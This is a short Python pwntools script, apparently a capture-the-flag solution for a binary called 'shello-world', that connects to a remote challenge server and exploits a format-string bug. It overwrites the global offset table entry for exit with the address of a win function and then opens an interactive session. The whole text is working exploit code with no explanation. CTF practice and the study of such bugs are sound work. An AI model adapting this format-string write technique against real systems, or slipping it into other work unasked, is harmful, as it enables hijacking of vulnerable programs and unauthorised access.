from pwn import * 

exe = context.binary = ELF('shello-world')

winaddr = exe.symbols['win']
exitaddr = exe.got['exit']

# offset = 6
io = remote('challs.tfcctf.com', 30340)

def findOffset(payload):
    io.sendline(payload)
    response = io.recvline()
    return response

fmt = FmtStr(findOffset, offset = 6)

fmt.write(exitaddr, winaddr)
fmt.execute_writes()
io.interactive()

